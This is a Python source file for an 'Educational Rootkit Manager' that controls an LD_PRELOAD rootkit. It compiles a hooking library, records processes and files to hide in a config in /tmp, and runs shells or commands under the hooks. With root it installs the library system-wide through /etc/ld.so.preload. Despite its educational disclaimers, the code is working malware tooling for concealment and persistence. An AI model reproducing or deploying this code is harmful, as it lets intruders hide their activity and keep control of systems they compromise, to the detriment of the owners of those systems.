"""
Educational Rootkit Manager
⚠️ FOR EDUCATIONAL PURPOSES ONLY

This demonstrates LD_PRELOAD rootkit techniques for educational purposes.
NEVER use this on systems you don't own or without authorization.
"""

import os
import subprocess
import sys
from pathlib import Path
from typing import List


class RootkitManager:
    """Manage LD_PRELOAD rootkit"""

    CONFIG_FILE = "/tmp/.rootkit.conf"
    LIB_NAME = "librootkit.so"

    def __init__(self, lib_path: Path = None):
        self.lib_path = lib_path or self._find_library()
        self.hidden_processes: List[str] = []
        self.hidden_files: List[str] = []

        print("=" * 60)
        print("⚠️  EDUCATIONAL ROOTKIT MANAGER")
        print("⚠️  FOR AUTHORIZED TESTING ONLY")
        print("=" * 60)
        print()

    def _find_library(self) -> Path:
        """Find compiled rootkit library"""
        possible_paths = [
            Path(__file__).parent.parent / "lib" / self.LIB_NAME,
            Path.cwd() / "lib" / self.LIB_NAME,
            Path.cwd() / self.LIB_NAME,
        ]

        for path in possible_paths:
            if path.exists():
                return path

        return None

    def compile_library(self):
        """Compile rootkit library from C source"""
        lib_dir = Path(__file__).parent.parent / "lib"
        source_file = lib_dir / "rootkit.c"
        output_file = lib_dir / self.LIB_NAME

        if not source_file.exists():
            print(f"❌ Source file not found: {source_file}")
            return False

        print(f"🔨 Compiling rootkit library...")
        print(f"   Source: {source_file}")
        print(f"   Output: {output_file}")

        try:
            cmd = [
                "gcc",
                "-shared",
                "-fPIC",
                "-o", str(output_file),
                str(source_file),
                "-ldl"
            ]

            result = subprocess.run(cmd, capture_output=True, text=True)

            if result.returncode == 0:
                print(f"✅ Library compiled successfully")
                self.lib_path = output_file
                return True
            else:
                print(f"❌ Compilation failed:")
                print(result.stderr)
                return False

        except FileNotFoundError:
            print("❌ gcc not found. Please install gcc.")
            return False
        except Exception as e:
            print(f"❌ Compilation error: {e}")
            return False

    def add_hidden_process(self, process_name: str):
        """Add process to hide list"""
        self.hidden_processes.append(process_name)
        print(f"➕ Added hidden process: {process_name}")

    def add_hidden_file(self, file_name: str):
        """Add file to hide list"""
        self.hidden_files.append(file_name)
        print(f"➕ Added hidden file: {file_name}")

    def save_config(self):
        """Save configuration to file"""
        try:
            with open(self.CONFIG_FILE, 'w') as f:
                for proc in self.hidden_processes:
                    f.write(f"PROCESS:{proc}\n")
                for file in self.hidden_files:
                    f.write(f"FILE:{file}\n")

            print(f"💾 Configuration saved to: {self.CONFIG_FILE}")
            return True
        except Exception as e:
            print(f"❌ Error saving config: {e}")
            return False

    def load_config(self):
        """Load configuration from file"""
        try:
            if not os.path.exists(self.CONFIG_FILE):
                return False

            self.hidden_processes = []
            self.hidden_files = []

            with open(self.CONFIG_FILE, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line.startswith("PROCESS:"):
                        self.hidden_processes.append(line[8:])
                    elif line.startswith("FILE:"):
                        self.hidden_files.append(line[5:])

            print(f"📂 Configuration loaded from: {self.CONFIG_FILE}")
            print(f"   Hidden processes: {len(self.hidden_processes)}")
            print(f"   Hidden files: {len(self.hidden_files)}")
            return True

        except Exception as e:
            print(f"❌ Error loading config: {e}")
            return False

    def show_config(self):
        """Display current configuration"""
        print("\n" + "=" * 60)
        print("ROOTKIT CONFIGURATION")
        print("=" * 60)

        print("\n📋 Hidden Processes:")
        if self.hidden_processes:
            for proc in self.hidden_processes:
                print(f"   - {proc}")
        else:
            print("   (none)")

        print("\n📋 Hidden Files:")
        if self.hidden_files:
            for file in self.hidden_files:
                print(f"   - {file}")
        else:
            print("   (none)")

        print("\n" + "=" * 60 + "\n")

    def activate(self, command: List[str] = None):
        """Activate rootkit using LD_PRELOAD"""
        if not self.lib_path or not self.lib_path.exists():
            print("❌ Rootkit library not found. Compile it first.")
            return False

        # Save configuration
        self.save_config()

        print(f"\n🚀 Activating rootkit...")
        print(f"   Library: {self.lib_path}")

        # Set LD_PRELOAD environment variable
        env = os.environ.copy()
        env['LD_PRELOAD'] = str(self.lib_path)

        if command:
            print(f"   Command: {' '.join(command)}")
            print("\n" + "=" * 60)
            print("ROOTKIT ACTIVE - Running command in hooked environment")
            print("=" * 60 + "\n")

            try:
                subprocess.run(command, env=env)
            except KeyboardInterrupt:
                print("\n\n🛑 Command interrupted")
        else:
            # Spawn a shell with rootkit active
            shell = env.get('SHELL', '/bin/bash')
            print(f"   Shell: {shell}")
            print("\n" + "=" * 60)
            print("ROOTKIT ACTIVE - Shell spawned with hooks")
            print("Type 'exit' to deactivate rootkit")
            print("=" * 60 + "\n")

            try:
                subprocess.run([shell], env=env)
            except KeyboardInterrupt:
                print("\n\n🛑 Shell interrupted")

        print("\n✅ Rootkit deactivated\n")
        return True

    def install_systemwide(self):
        """Install rootkit system-wide (requires root)"""
        print("⚠️  SYSTEM-WIDE INSTALLATION")
        print("This will modify /etc/ld.so.preload to load the rootkit for all processes.")
        print()

        if os.geteuid() != 0:
            print("❌ Root privileges required for system-wide installation")
            return False

        if not self.lib_path or not self.lib_path.exists():
            print("❌ Rootkit library not found")
            return False

        response = input("Type 'INSTALL' to continue: ")
        if response != 'INSTALL':
            print("Operation cancelled")
            return False

        try:
            # Copy library to system location
            system_lib_path = Path("/usr/lib") / self.LIB_NAME
            subprocess.run(["cp", str(self.lib_path), str(system_lib_path)], check=True)
            print(f"✅ Library copied to {system_lib_path}")

            # Add to ld.so.preload
            with open("/etc/ld.so.preload", "a") as f:
                f.write(f"{system_lib_path}\n")

            print(f"✅ Added to /etc/ld.so.preload")
            print("\n⚠️  Rootkit now active system-wide!")
            return True

        except Exception as e:
            print(f"❌ Installation failed: {e}")
            return False

    def uninstall_systemwide(self):
        """Uninstall system-wide rootkit"""
        print("🧹 UNINSTALLING SYSTEM-WIDE ROOTKIT")

        if os.geteuid() != 0:
            print("❌ Root privileges required")
            return False

        try:
            # Remove from ld.so.preload
            system_lib_path = Path("/usr/lib") / self.LIB_NAME

            if os.path.exists("/etc/ld.so.preload"):
                with open("/etc/ld.so.preload", "r") as f:
                    lines = f.readlines()

                with open("/etc/ld.so.preload", "w") as f:
                    for line in lines:
                        if str(system_lib_path) not in line:
                            f.write(line)

                print("✅ Removed from /etc/ld.so.preload")

            # Remove library
            if system_lib_path.exists():
                os.remove(system_lib_path)
                print(f"✅ Removed {system_lib_path}")

            # Remove config
            if os.path.exists(self.CONFIG_FILE):
                os.remove(self.CONFIG_FILE)
                print(f"✅ Removed {self.CONFIG_FILE}")

            print("\n✅ Rootkit uninstalled\n")
            return True

        except Exception as e:
            print(f"❌ Uninstallation failed: {e}")
            return False


def main():
    """Main function"""
    import argparse

    parser = argparse.ArgumentParser(
        description="Educational Rootkit Manager",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
⚠️  FOR EDUCATIONAL PURPOSES ONLY
This tool demonstrates LD_PRELOAD rootkit techniques.
NEVER use on systems you don't own or without authorization.

Examples:
  # Compile the rootkit library
  python rootkit_manager.py --compile

  # Hide a process and spawn shell
  python rootkit_manager.py --hide-process python3 --activate

  # Hide multiple items and run command
  python rootkit_manager.py --hide-process ssh --hide-file secret.txt --activate -- ls -la /proc
        """
    )

    parser.add_argument("--compile", action="store_true", help="Compile rootkit library")
    parser.add_argument("--hide-process", action="append", help="Add process to hide")
    parser.add_argument("--hide-file", action="append", help="Add file to hide")
    parser.add_argument("--activate", action="store_true", help="Activate rootkit")
    parser.add_argument("--install", action="store_true", help="Install system-wide (requires root)")
    parser.add_argument("--uninstall", action="store_true", help="Uninstall system-wide")
    parser.add_argument("--show", action="store_true", help="Show current configuration")
    parser.add_argument("--load-config", action="store_true", help="Load existing configuration")
    parser.add_argument("command", nargs="*", help="Command to run with rootkit active")

    args = parser.parse_args()

    manager = RootkitManager()

    # Compile if requested
    if args.compile:
        if not manager.compile_library():
            sys.exit(1)
        print()

    # Load existing config if requested
    if args.load_config:
        manager.load_config()

    # Add hidden items
    if args.hide_process:
        for proc in args.hide_process:
            manager.add_hidden_process(proc)

    if args.hide_file:
        for file in args.hide_file:
            manager.add_hidden_file(file)

    # Show configuration
    if args.show or (not args.activate and not args.install and not args.uninstall):
        manager.show_config()

    # Install system-wide
    if args.install:
        manager.install_systemwide()
        return

    # Uninstall system-wide
    if args.uninstall:
        manager.uninstall_systemwide()
        return

    # Activate rootkit
    if args.activate:
        if not manager.lib_path:
            print("❌ Rootkit library not found. Run with --compile first.")
            sys.exit(1)

        manager.activate(args.command if args.command else None)


if __name__ == "__main__":
    main()
